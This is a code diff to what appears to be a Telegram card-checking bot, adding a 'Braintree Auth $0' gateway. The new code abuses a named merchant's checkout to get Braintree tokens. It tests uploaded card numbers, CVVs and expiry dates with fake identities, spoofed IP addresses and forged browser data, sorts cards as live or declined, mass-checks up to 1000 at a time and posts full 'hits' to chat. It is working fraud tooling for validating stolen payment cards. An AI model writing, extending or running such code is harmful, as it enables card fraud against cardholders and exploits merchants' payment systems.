@@ -61,6 +61,8 @@ STRIPE_CARDS_FILE = os.path.join(DATA_DIR, "stripe_cards.json")
 STRIPE_HITS_FILE = os.path.join(DATA_DIR, "stripe_hits.json")
 SC_CARDS_FILE = os.path.join(DATA_DIR, "sc_cards.json")
 SC_HITS_FILE = os.path.join(DATA_DIR, "sc_hits.json")
+B3_CARDS_FILE = os.path.join(DATA_DIR, "b3_cards.json")
+B3_HITS_FILE = os.path.join(DATA_DIR, "b3_hits.json")
 API_URL = os.environ.get("API_URL", "http://108.165.12.183:8081")
 MAX_CARDS_PER_BATCH = 999999
 
@@ -82,6 +84,7 @@ mode_workers = {
 }
 PARALLEL_WORKERS = mode_workers[current_mode]
 SC_PARALLEL_WORKERS = 1
+B3_PARALLEL_WORKERS = 1
 
 # Update cada 5 cards
 UPDATE_BATCH_SIZE = 5
@@ -118,6 +121,7 @@ bin_cache_expiry = 3600
 hits_list = []
 stripe_hits_list = []
 sc_hits_list = []
+b3_hits_list = []
 last_dead_proxies = []
 pending_file_cards = {}
 
@@ -176,6 +180,9 @@ SC_ADDRESSES = [
 sc_mass_running = False
 sc_form_hash = None
 sc_http_session = None
+b3_mass_running = False
+b3_auth_fp = None
+b3_http_session = None
 
 # ============================================
 # COUNTRY FLAGS
@@ -1046,6 +1053,375 @@ def clear_sc_hits():
     global sc_hits_list
     sc_hits_list = []
     safe_json_save(SC_HITS_FILE, [])
+
+# ============================================
+# BRAINTREE AUTH GATEWAY (trade-chem.co.uk)
+# ============================================
+
+B3_SITE_URL = "https://trade-chem.co.uk"
+B3_PRODUCT_URL = f"{B3_SITE_URL}/product/24mm-white-heavy-mill-boston-cap-x-25/"
+B3_PRODUCT_ID = "1879"
+B3_CHECKOUT_URL = f"{B3_SITE_URL}/checkout/"
+B3_MERCHANT_ID = "zkrjk5krj2dwnsgc"
+B3_MERCHANT_ACCOUNT = "stuarttradechemcouk"
+B3_GRAPHQL_URL = "https://payments.braintree-api.com/graphql"
+B3_CLIENT_API = f"https://api.braintreegateway.com:443/merchants/{B3_MERCHANT_ID}/client_api"
+B3_NONCE_REFRESH_EVERY = 5
+B3_FIRST_NAMES = ["James","Mary","John","Patricia","Robert","Jennifer","Michael","Linda",
+                   "David","Elizabeth","William","Barbara","Richard","Susan","Joseph","Jessica",
+                   "Thomas","Sarah","Charles","Karen","Daniel","Lisa","Mark","Nancy"]
+B3_LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
+                  "Rodriguez","Martinez","Wilson","Anderson","Taylor","Thomas","Moore","Jackson"]
+B3_ADDRESSES = [
+    {"line1": "236 W 30TH", "city": "NEW YORK", "state": "NY", "zip": "10001", "country": "US"},
+    {"line1": "100 BROADWAY", "city": "NEW YORK", "state": "NY", "zip": "10005", "country": "US"},
+    {"line1": "742 EVERGREEN TER", "city": "SPRINGFIELD", "state": "IL", "zip": "62704", "country": "US"},
+    {"line1": "123 MAIN ST", "city": "LOS ANGELES", "state": "CA", "zip": "90001", "country": "US"},
+    {"line1": "10 DOWNING ST", "city": "LONDON", "state": "", "zip": "SW1A 1AA", "country": "GB"},
+    {"line1": "221B BAKER ST", "city": "LONDON", "state": "", "zip": "NW1 6XE", "country": "GB"},
+    {"line1": "1 HIGH ST", "city": "MANCHESTER", "state": "", "zip": "M1 1AD", "country": "GB"},
+]
+
+def b3_random_identity():
+    first = random.choice(B3_FIRST_NAMES)
+    last = random.choice(B3_LAST_NAMES)
+    user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8,12)))
+    domain = random.choice(["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"])
+    return first, last, f"{user}@{domain}", random.choice(B3_ADDRESSES)
+
+def b3_get_session_and_auth(session=None):
+    if session is None:
+        session = requests.Session()
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
+                          '(KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
+        })
+    try:
+        session.get(B3_PRODUCT_URL, verify=False, timeout=30)
+        session.post(B3_PRODUCT_URL,
+                     data={'quantity': '1', 'add-to-cart': B3_PRODUCT_ID},
+                     verify=False, timeout=30, allow_redirects=True)
+        r = session.get(B3_CHECKOUT_URL, verify=False, timeout=30)
+        cm_match = re.search(r'wc_braintree_client_manager_params\s*=\s*(\{[^;]+)', r.text)
+        if not cm_match:
+            return session, None
+        cm = json.loads(cm_match.group(1).rstrip(';'))
+        wpnonce = cm.get('_wpnonce', '')
+        token_url = (f'{B3_SITE_URL}/?wc-ajax=wc_braintree_frontend_request'
+                     f'&path=/wc-braintree/v1/client-token/create')
+        r2 = session.post(token_url, verify=False, timeout=30,
+                          headers={
+                              'X-Requested-With': 'XMLHttpRequest',
+                              'Referer': f'{B3_SITE_URL}/checkout/'
+                          },
+                          data={
+                              'currency': 'GBP',
+                              'merchant_account': B3_MERCHANT_ACCOUNT,
+                              '_wpnonce': wpnonce
+                          })
+        if r2.status_code != 200:
+            return session, None
+        client_token_b64 = r2.text.strip('"')
+        decoded = json.loads(base64.b64decode(client_token_b64))
+        auth_fp = decoded.get('authorizationFingerprint', '')
+        if not auth_fp:
+            return session, None
+        return session, auth_fp
+    except:
+        return session, None
+
+def b3_refresh_auth(session):
+    try:
+        r = session.get(B3_CHECKOUT_URL, verify=False, timeout=30)
+        cm_match = re.search(r'wc_braintree_client_manager_params\s*=\s*(\{[^;]+)', r.text)
+        if not cm_match:
+            return None
+        cm = json.loads(cm_match.group(1).rstrip(';'))
+        wpnonce = cm.get('_wpnonce', '')
+        token_url = (f'{B3_SITE_URL}/?wc-ajax=wc_braintree_frontend_request'
+                     f'&path=/wc-braintree/v1/client-token/create')
+        r2 = session.post(token_url, verify=False, timeout=30,
+                          headers={
+                              'X-Requested-With': 'XMLHttpRequest',
+                              'Referer': f'{B3_SITE_URL}/checkout/'
+                          },
+                          data={
+                              'currency': 'GBP',
+                              'merchant_account': B3_MERCHANT_ACCOUNT,
+                              '_wpnonce': wpnonce
+                          })
+        if r2.status_code != 200:
+            return None
+        client_token_b64 = r2.text.strip('"')
+        decoded = json.loads(base64.b64decode(client_token_b64))
+        return decoded.get('authorizationFingerprint', None)
+    except:
+        return None
+
+def b3_tokenize_card(session, auth_fp, cc, mm, yy, cvv, addr):
+    graphql_body = {
+        "clientSdkMetadata": {
+            "source": "client",
+            "integration": "custom",
+            "sessionId": str(uuid.uuid4())
+        },
+        "query": ("mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) "
+                  "{ tokenizeCreditCard(input: $input) { token creditCard { bin brandCode "
+                  "last4 cardholderName expirationMonth expirationYear binData { prepaid "
+                  "healthcare debit durbinRegulated commercial payroll issuingBank "
+                  "countryOfIssuance productId } } } }"),
+        "variables": {
+            "input": {
+                "creditCard": {
+                    "number": cc,
+                    "expirationMonth": mm,
+                    "expirationYear": yy,
+                    "cvv": cvv,
+                    "billingAddress": {
+                        "postalCode": addr.get("zip", "SW1A 1AA"),
+                        "streetAddress": addr.get("line1", "236 W 30TH")
+                    }
+                },
+                "options": {"validate": False}
+            }
+        },
+        "operationName": "TokenizeCreditCard"
+    }
+    headers = {
+        "Content-Type": "application/json",
+        "Authorization": f"Bearer {auth_fp}",
+        "Braintree-Version": "2018-05-10"
+    }
+    try:
+        resp = session.post(B3_GRAPHQL_URL, json=graphql_body, headers=headers,
+                            verify=False, timeout=30)
+        return resp.status_code, resp.json()
+    except Exception as e:
+        return 0, {"errors": [{"message": str(e)}]}
+
+def b3_three_ds_lookup(session, auth_fp, token, cc, first, last, email, addr):
+    lookup_url = f"{B3_CLIENT_API}/v1/payment_methods/{token}/three_d_secure/lookup"
+    body = {
+        "amount": "0.00",
+        "browserColorDepth": 24,
+        "browserJavaEnabled": False,
+        "browserJavascriptEnabled": True,
+        "browserLanguage": "es-US",
+        "browserScreenHeight": 1086,
+        "browserScreenWidth": 501,
+        "browserTimeZone": 300,
+        "deviceChannel": "Browser",
+        "additionalInfo": {
+            "ipAddress": (f"{random.randint(1,223)}.{random.randint(0,255)}"
+                          f".{random.randint(0,255)}.{random.randint(1,254)}"),
+            "billingLine1": addr.get("line1", "236 W 30TH"),
+            "billingLine2": "",
+            "billingCity": addr.get("city", "NEW YORK"),
+            "billingState": addr.get("state", ""),
+            "billingPostalCode": addr.get("zip", "SW1A 1AA"),
+            "billingCountryCode": addr.get("country", "GB"),
+            "billingPhoneNumber": "",
+            "billingGivenName": first,
+            "billingSurname": last,
+            "email": email
+        },
+        "challengeRequested": True,
+        "bin": cc[:6],
+        "dfReferenceId": f"0_{uuid.uuid4()}",
+        "clientMetadata": {
+            "requestedThreeDSecureVersion": "2",
+            "sdkVersion": "web/3.133.0",
+            "cardinalDeviceDataCollectionTimeElapsed": random.randint(300, 600),
+            "issuerDeviceDataCollectionTimeElapsed": random.randint(2000, 5000),
+            "issuerDeviceDataCollectionResult": True
+        },
+        "authorizationFingerprint": auth_fp,
+        "braintreeLibraryVersion": "braintree/web/3.133.0",
+        "_meta": {
+            "merchantAppId": "trade-chem.co.uk",
+            "platform": "web",
+            "sdkVersion": "3.133.0",
+            "source": "client",
+            "integration": "custom",
+            "integrationType": "custom",
+            "sessionId": str(uuid.uuid4())
+        }
+    }
+    try:
+        resp = session.post(lookup_url, json=body, verify=False, timeout=30)
+        return resp.status_code, resp.json()
+    except Exception as e:
+        return 0, {"errors": [{"message": str(e)}]}
+
+def b3_classify_error_msg(msg):
+    ml = msg.lower()
+    if "cvv" in ml or "security code" in ml or "cvc" in ml:
+        return "CVV", msg
+    if "number" in ml or "invalid" in ml or "credit card" in ml:
+        return "DECLINED", msg
+    if "expired" in ml:
+        return "DECLINED", msg
+    if "declined" in ml or "do not honor" in ml:
+        return "DECLINED", msg
+    if "fraud" in ml or "stolen" in ml or "lost" in ml:
+        return "DECLINED", msg
+    if "restricted" in ml or "not permitted" in ml or "limit" in ml:
+        return "DECLINED", msg
+    if "insufficient" in ml or "funds" in ml:
+        return "DECLINED", msg
+    return "DECLINED", msg
+
+def b3_classify_tokenize(status_code, resp):
+    if status_code == 200:
+        data = resp.get("data", {})
+        tok = data.get("tokenizeCreditCard", {})
+        token = tok.get("token", "")
+        if token:
+            return "TOKEN", token
+        errors = resp.get("errors", [])
+        if errors:
+            msg = errors[0].get("message", "Unknown")
+            return b3_classify_error_msg(msg)
+        return "ERROR", "No token"
+    errors = resp.get("errors", [])
+    if errors:
+        msg = errors[0].get("message", "Unknown")
+        return b3_classify_error_msg(msg)
+    return "ERROR", f"HTTP {status_code}"
+
+def b3_classify_3ds(status_code, resp):
+    if status_code == 0:
+        return "ERROR", "Connection failed", ""
+    errors = resp.get("errors", [])
+    if errors:
+        msg = errors[0].get("message", "Unknown")
+        result, detail = b3_classify_error_msg(msg)
+        return result, detail, ""
+    pm = resp.get("paymentMethod", {})
+    tds = pm.get("threeDSecureInfo", {}) or resp.get("threeDSecureInfo", {})
+    nonce = pm.get("nonce", "")
+    if not tds:
+        if nonce:
+            return "LIVE", "Card approved (no 3DS info)", nonce
+        return "ERROR", "No 3DS info", ""
+    status = tds.get("status", "").lower()
+    shifted = tds.get("liabilityShifted", False)
+    possible = tds.get("liabilityShiftPossible", False)
+    enrolled = tds.get("enrolled", "")
+    if status in ("authenticate_successful", "authenticate_attempt_successful"):
+        return "LIVE", f"Authenticated - {status}", nonce
+    if status == "challenge_required":
+        return "3DS", f"3DS Challenge Required (enrolled={enrolled})", nonce
+    if status in ("authenticate_rejected", "authenticate_error"):
+        return "DECLINED", f"Authentication rejected - {status}", nonce
+    if status in ("lookup_not_enrolled", "lookup_bypassed", "lookup_error"):
+        return "LIVE", f"Not enrolled in 3DS - {status}", nonce
+    if status == "lookup_enrolled":
+        return "3DS", "3DS Enrolled - challenge pending", nonce
+    if status in ("unsupported_card", "lookup_card_error"):
+        return "DECLINED", f"Card not supported - {status}", nonce
+    if status == "authentication_unavailable":
+        return "LIVE", f"Auth unavailable (card likely valid) - {status}", nonce
+    if nonce:
+        if enrolled == "N":
+            return "LIVE", f"Not enrolled (status={status})", nonce
+        if possible and not shifted:
+            return "3DS", f"3DS possible (status={status})", nonce
+        return "DECLINED", f"Unknown status: {status}", nonce
+    return "DECLINED", f"Unknown: {status}", ""
+
+def check_braintree_auth(cc, month, year, cvv, session=None, auth_fp=None):
+    global b3_auth_fp, b3_http_session
+    start_time = time.time()
+    if len(year) == 2:
+        year = f"20{year}"
+    month = month.zfill(2)
+    
+    first, last, email, addr = b3_random_identity()
+    
+    try:
+        if session is None or auth_fp is None:
+            session, auth_fp = b3_get_session_and_auth(session)
+            if not auth_fp:
+                elapsed = round(time.time() - start_time, 2)
+                return "ERROR", "Failed to get auth fingerprint", "Failed to get auth fingerprint", "$0.00", "Braintree Auth $0", elapsed, session, auth_fp
+        
+        tok_status, tok_resp = b3_tokenize_card(session, auth_fp, cc, month, year, cvv, addr)
+        result, msg = b3_classify_tokenize(tok_status, tok_resp)
+        
+        if result != "TOKEN":
+            elapsed = round(time.time() - start_time, 2)
+            return result, msg, msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp
+        
+        token = msg
+        
+        lk_status, lk_resp = b3_three_ds_lookup(session, auth_fp, token, cc,
+                                                  first, last, email, addr)
+        result, msg, nonce = b3_classify_3ds(lk_status, lk_resp)
+        
+        elapsed = round(time.time() - start_time, 2)
+        return result, msg, msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp
+        
+    except requests.exceptions.Timeout:
+        elapsed = round(time.time() - start_time, 2)
+        return "ERROR", "Timeout", "Request timed out", "$0.00", "Braintree Auth $0", elapsed, session, auth_fp
+    except Exception as e:
+        elapsed = round(time.time() - start_time, 2)
+        return "ERROR", str(e)[:80], str(e)[:80], "$0.00", "Braintree Auth $0", elapsed, session, auth_fp
+
+# ============================================
+# BRAINTREE AUTH CARD MANAGEMENT
+# ============================================
+
+def load_b3_cards():
+    return safe_json_load(B3_CARDS_FILE, [])
+
+def save_b3_cards(cards):
+    safe_json_save(B3_CARDS_FILE, cards)
+
+def add_b3_card(cc, month, year, cvv):
+    cards = load_b3_cards()
+    card_str = f"{cc}|{month}|{year}|{cvv}"
+    if card_str not in cards:
+        cards.append(card_str)
+        save_b3_cards(cards)
+        return True
+    return False
+
+def clear_b3_cards():
+    save_b3_cards([])
+
+def get_all_b3_cards():
+    return load_b3_cards()
+
+def delete_b3_card(card_str):
+    cards = load_b3_cards()
+    if card_str in cards:
+        cards.remove(card_str)
+        save_b3_cards(cards)
+        return True
+    return False
+
+def load_b3_hits():
+    return safe_json_load(B3_HITS_FILE, [])
+
+def save_b3_hit(hit_data):
+    global b3_hits_list
+    b3_hits_list.append(hit_data)
+    hits = load_b3_hits()
+    hits.append(hit_data)
+    safe_json_save(B3_HITS_FILE, hits)
+
+def get_b3_hits():
+    global b3_hits_list
+    if not b3_hits_list:
+        b3_hits_list = load_b3_hits()
+    return b3_hits_list
+
+def clear_b3_hits():
+    global b3_hits_list
+    b3_hits_list = []
+    safe_json_save(B3_HITS_FILE, [])
 
 # ============================================
 # SAFE JSON HANDLING
@@ -2078,6 +2454,47 @@ def format_sc_response(card_data, category, status_msg, response_msg, price, gat
     message += f"\n\u26a1 {stylize_text('Checked by')}: {BOT_NAME} {BOT_VERSION}"
     return message
 
+def format_b3_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info):
+    cc = card_data.get('cc', '')
+    month = card_data.get('month', '')
+    year = card_data.get('year', '')
+    cvv = card_data.get('cvv', '')
+    
+    if category == 'LIVE':
+        title = f"\u26a1 {stylize_text('Card Live')}"
+    elif category == '3DS':
+        title = f"\u26a1 {stylize_text('3DS Required')}"
+    elif category == 'CVV':
+        title = f"\u26a1 {stylize_text('CVV Match')}"
+    elif category == 'DECLINED':
+        title = f"\u26a1 {stylize_text('Card Declined')}"
+    else:
+        title = f"\u26a1 {stylize_text('Unknown Response')}"
+    
+    message = f"{title}\n\n"
+    message += f"\u26a1 {stylize_text('CC')}: {cc}|{month}|{year}|{cvv}\n"
+    message += f"\u26a1 {stylize_text('Gate')}: {stylize_text('Braintree Auth $0')}\n"
+    message += f"\u26a1 {stylize_text('Response')}: {stylize_text(response_msg if response_msg else status_msg)}\n"
+    message += f"\u26a1 {stylize_text('Price')}: {stylize_text(price)}\n"
+    
+    if bin_info:
+        message += f"\n\u26a1 {stylize_text('BIN Info')}:\n"
+        brand = bin_info.get('brand', bin_info.get('info', 'Unknown'))
+        card_type = bin_info.get('type', 'Unknown')
+        level = bin_info.get('level', '')
+        bank = bin_info.get('bank', 'Unknown')
+        country = bin_info.get('country', 'Unknown')
+        message += f"\u26a1 {stylize_text('Brand')}: {stylize_text(str(brand).upper())}\n"
+        message += f"\u26a1 {stylize_text('Type')}: {stylize_text(str(card_type).upper())}\n"
+        if level:
+            message += f"\u26a1 {stylize_text('Level')}: {stylize_text(str(level).upper())}\n"
+        message += f"\u26a1 {stylize_text('Bank')}: {stylize_text(str(bank).upper())}\n"
+        message += f"\u26a1 {stylize_text('Country')}: {country}\n"
+    
+    message += f"\n\u26a1 {stylize_text('Time')}: {stylize_text(str(elapsed) + 's')}"
+    message += f"\n\u26a1 {stylize_text('Checked by')}: {BOT_NAME} {BOT_VERSION}"
+    return message
+
 # ============================================
 # BATCH SENDER
 # ============================================
@@ -2149,7 +2566,13 @@ def get_main_keyboard():
         InlineKeyboardButton("💳 SC MASS", callback_data="sc_mass"),
         InlineKeyboardButton("💳 SC HITS", callback_data="sc_hits")
     )
-    # ── Row 4: Infrastructure ──
+    # ── Row 4: Braintree Auth $0 ──
+    keyboard.row(
+        InlineKeyboardButton("🔐 B3 CHK", callback_data="b3_check"),
+        InlineKeyboardButton("🔐 B3 MASS", callback_data="b3_mass"),
+        InlineKeyboardButton("🔐 B3 HITS", callback_data="b3_hits")
+    )
+    # ── Row 5: Infrastructure ──
     keyboard.row(
         InlineKeyboardButton("🌐 Sites", callback_data="sites"),
         InlineKeyboardButton("📡 Proxies", callback_data="proxies"),
@@ -2281,6 +2704,7 @@ def handle_document(message):
             InlineKeyboardButton("🛒 Shopify", callback_data="file_gw_shopify"),
             InlineKeyboardButton("🔓 Stripe Auth (FREE)", callback_data="file_gw_stripe_auth"),
             InlineKeyboardButton("💳 Stripe Charge $10", callback_data="file_gw_stripe_charge"),
+            InlineKeyboardButton("🔐 Braintree Auth $0", callback_data="file_gw_braintree_auth"),
             InlineKeyboardButton("📦 ALL GATEWAYS", callback_data="file_gw_all")
         )
         
@@ -2322,6 +2746,11 @@ def process_file_cards_to_gateway(chat_id_str, gateway):
                 dup += 1
         elif gateway == "stripe_charge":
             if add_sc_card(cc, month, year, cvv):
+                added += 1
+            else:
+                dup += 1
+        elif gateway == "braintree_auth":
+            if add_b3_card(cc, month, year, cvv):
                 added += 1
             else:
                 dup += 1
@@ -2519,6 +2948,53 @@ def sc_command(message):
             'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         }
         save_sc_hit(hit_data)
+    
+    try:
+        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
+    except:
+        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)
+
+# ============================================
+# BRAINTREE AUTH INDIVIDUAL COMMAND
+# ============================================
+
+@bot.message_handler(commands=['b3'])
+def b3_command(message):
+    global b3_http_session, b3_auth_fp
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "❌ Format: /b3 cc|mm|yy|cvv")
+        return
+    card_str = args[1]
+    if '|' not in card_str and len(args) >= 5:
+        card_str = f"{args[1]}|{args[2]}|{args[3]}|{args[4]}"
+    parts = card_str.split('|')
+    if len(parts) < 4:
+        bot.reply_to(message, "❌ Invalid format. Use: cc|mm|yy|cvv")
+        return
+    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+    if not cc.isdigit() or len(cc) < 13:
+        bot.reply_to(message, "❌ Invalid card number")
+        return
+    
+    processing_msg = bot.reply_to(message, "💳 *Checking with Braintree Auth $0 Gateway...*\n⏳ Please wait...", parse_mode='Markdown')
+    
+    bin_info = bin_lookup(cc[:6])
+    result = check_braintree_auth(cc, month, year, cvv, session=b3_http_session, auth_fp=b3_auth_fp)
+    category, status_msg, response_msg, price, gateway, elapsed, b3_http_session, b3_auth_fp = result
+    card_data = {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}
+    response = format_b3_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info)
+    
+    if category in ['LIVE', '3DS', 'CVV']:
+        hit_data = {
+            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
+            'category': category, 'status_msg': status_msg,
+            'response_msg': response_msg,
+            'gateway': gateway, 'price': price, 'elapsed': elapsed,
+            'bin_info': bin_info,
+            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+        save_b3_hit(hit_data)
     
     try:
         bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
@@ -2835,6 +3311,304 @@ def clear_sc_command(message):
 📊 *Remaining:* 0
 
 💡 Send a new `.txt` file (name with 'charge' or 'sc') to load more cards"""
+    safe_send_message(message.chat.id, response, parse_mode='Markdown')
+
+# ============================================
+# BRAINTREE AUTH MASS CHECK (1x - SEQUENTIAL)
+# ============================================
+
+@bot.message_handler(commands=['mb3'])
+def b3_mass_command(message):
+    global b3_mass_running, stop_mass_flag, current_mass_msg, current_mass_chat_id, mass_paused, b3_http_session, b3_auth_fp
+    
+    if mass_check_running or stripe_mass_running or sc_mass_running or b3_mass_running:
+        bot.reply_to(message, "⚠️ A mass check is already in progress. Use STOP button or /stop")
+        return
+    
+    cards = get_all_b3_cards()
+    if not cards:
+        bot.reply_to(message, "❌ No Braintree Auth cards saved. Send a .txt file and select Braintree Auth.")
+        return
+    
+    total = len(cards)
+    if total > 1000:
+        bot.reply_to(message, f"⚠️ Found {total} CCs in file\nProcessing only first 1000 CCs\n1000 CCs will be checked")
+        cards = cards[:1000]
+        total = 1000
+    
+    stop_mass_flag = False
+    mass_paused = False
+    b3_mass_running = True
+    
+    control_buttons = InlineKeyboardMarkup(row_width=1)
+    control_buttons.add(
+        InlineKeyboardButton("🛑 DETENER MASS CHECK", callback_data="stop_mass")
+    )
+    
+    progress_bar = create_progress_bar(0, total)
+    msg_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ *BRAINTREE AUTH $0 MASS CHECK (1x)*
+
+`{progress_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💳 *Card:* `WAITING...`
+📝 *Response:* `CONNECTING...`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💰 Live: *0*  │  ✅ Approved: *0*
+❌ Declined: *0*  │  📊 `[0/{total}]`"""
+    
+    progress_msg = safe_send_message(message.chat.id, msg_text, parse_mode='Markdown', reply_markup=control_buttons)
+    
+    current_mass_msg = progress_msg
+    current_mass_chat_id = message.chat.id
+    
+    def run_b3_mass(chat_id, msg_id):
+        global b3_mass_running, stop_mass_flag
+        
+        try:
+            _run_b3_mass_inner(chat_id, msg_id)
+        finally:
+            b3_mass_running = False
+            stop_mass_flag = False
+    
+    def _run_b3_mass_inner(chat_id, msg_id):
+        global b3_mass_running, stop_mass_flag, b3_http_session, b3_auth_fp
+        
+        stats = {
+            'live': 0, 'threeds': 0, 'cvv': 0,
+            'declined': 0, 'errors': 0, 'total': total
+        }
+        
+        completed = 0
+        last_card = "WAITING..."
+        last_response = "CONNECTING..."
+        last_price = "N/A"
+        
+        task_queue = Queue()
+        result_queue = Queue()
+        
+        for card_str in cards:
+            task_queue.put(card_str)
+        
+        for _ in range(B3_PARALLEL_WORKERS):
+            task_queue.put(None)
+        
+        def b3_worker(worker_id):
+            global b3_http_session, b3_auth_fp
+            while not stop_mass_flag:
+                if mass_paused:
+                    time.sleep(1)
+                    continue
+                try:
+                    card_str = task_queue.get(timeout=1)
+                    if card_str is None:
+                        break
+                    
+                    parts = card_str.split('|')
+                    if len(parts) < 4:
+                        result_queue.put(('error', card_str, None, worker_id))
+                        continue
+                    
+                    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+                    bin_info = bin_lookup(cc[:6])
+                    result = check_braintree_auth(cc, month, year, cvv, session=b3_http_session, auth_fp=b3_auth_fp)
+                    category, status_msg, response_msg, price, gateway, elapsed, b3_http_session, b3_auth_fp = result
+                    result_queue.put(('success', card_str, (category, status_msg, response_msg, price, gateway, elapsed), worker_id, cc, month, year, cvv, bin_info))
+                except:
+                    continue
+        
+        workers = []
+        for i in range(B3_PARALLEL_WORKERS):
+            w = threading.Thread(target=b3_worker, args=(i,))
+            w.daemon = True
+            w.start()
+            workers.append(w)
+        
+        processed_cards = set()
+        update_counter = 0
+        
+        def send_update():
+            nonlocal last_card, last_response, last_price, update_counter
+            
+            total_approved = stats['live'] + stats['threeds'] + stats['cvv']
+            
+            if update_counter % 5 == 0 or update_counter == 0 or completed == total:
+                progress_bar = create_progress_bar(completed, total)
+                update_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ *BRAINTREE AUTH $0 MASS CHECK (1x)*
+
+`{progress_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💳 *Card:* `{last_card}`
+📝 *Response:* `{last_response}`
+💲 *Price:* `{last_price}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💰 Live: *{stats['live']}*  │  ✅ Approved: *{total_approved}*
+❌ Declined: *{stats['declined']}*  │  📊 `[{completed}/{total}]`"""
+                
+                if not stop_mass_flag:
+                    try:
+                        bot.edit_message_text(update_text, chat_id=chat_id, message_id=msg_id,
+                                            parse_mode='Markdown', reply_markup=control_buttons)
+                    except:
+                        pass
+        
+        start_time = time.time()
+        
+        while completed < total and not stop_mass_flag:
+            try:
+                result_data = result_queue.get(timeout=0.5)
+                
+                if result_data[0] == 'error':
+                    card_str = result_data[1]
+                    if card_str in processed_cards:
+                        continue
+                    processed_cards.add(card_str)
+                    completed += 1
+                    stats['errors'] += 1
+                    delete_b3_card(card_str)
+                    update_counter += 1
+                    send_update()
+                else:
+                    _, card_str, result, worker_id, cc, month, year, cvv, bin_info = result_data
+                    
+                    if card_str in processed_cards:
+                        continue
+                    processed_cards.add(card_str)
+                    
+                    category, status_msg, response_msg, price, gateway, elapsed = result
+                    
+                    last_card = f"{cc[:6]}******{cc[-4:]}"
+                    last_response = response_msg if response_msg else status_msg
+                    last_price = price
+                    
+                    if category in ['LIVE', '3DS', 'CVV']:
+                        if category == 'LIVE':
+                            stats['live'] += 1
+                        elif category == '3DS':
+                            stats['threeds'] += 1
+                        elif category == 'CVV':
+                            stats['cvv'] += 1
+                        
+                        icon, cat_display, dot = get_status_emoji(category)
+                        hit_msg = f"""{dot} *BRAINTREE AUTH $0 ─ APPROVED* {dot}
+{LINE_THIN}
+💳 `{cc}|{month}|{year}|{cvv}`
+🌐 {gateway}
+📝 {response_msg}
+💲 {price}
+{LINE_THIN}"""
+                        
+                        try:
+                            bot.send_message(chat_id, hit_msg, parse_mode='Markdown')
+                        except:
+                            bot.send_message(chat_id, hit_msg.replace('`', '').replace('*', ''))
+                        
+                        hit_data = {
+                            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
+                            'category': category, 'status_msg': response_msg,
+                            'response_msg': response_msg,
+                            'gateway': gateway, 'price': price, 'elapsed': elapsed,
+                            'bin_info': bin_info,
+                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                        }
+                        save_b3_hit(hit_data)
+                    elif category == 'DECLINED':
+                        stats['declined'] += 1
+                    else:
+                        stats['errors'] += 1
+                    
+                    completed += 1
+                    delete_b3_card(card_str)
+                    update_counter += 1
+                    send_update()
+                    
+            except:
+                continue
+        
+        for w in workers:
+            try:
+                w.join(timeout=2)
+            except:
+                pass
+        
+        elapsed = time.time() - start_time
+        minutes, seconds = int(elapsed // 60), int(elapsed % 60)
+        total_approved = stats['live'] + stats['threeds'] + stats['cvv']
+        
+        try:
+            sqlite_backup.update_daily_stats(completed, total_approved, stats['declined'], stats['errors'], 0, 0, current_mode)
+        except:
+            pass
+        
+        was_stopped = stop_mass_flag
+        status_label = "🛑 *MASS CHECK STOPPED*" if was_stopped else "🏁 *MASS CHECK COMPLETED*"
+        
+        final_bar = create_progress_bar(completed, total)
+        final_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{status_label}
+
+`{final_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💰 *Live:* {stats['live']}
+✅ *Approved:* {total_approved}
+❌ *Declined:* {stats['declined']}
+📊 *Total:* {completed}
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+⏱ *Time:* {minutes}m {seconds}s"""
+        
+        result_keyboard = InlineKeyboardMarkup()
+        result_keyboard.row(
+            InlineKeyboardButton("🏆 Ver Hits", callback_data="b3_hits"),
+            InlineKeyboardButton("📦 Nuevo Mass", callback_data="b3_mass")
+        )
+        
+        try:
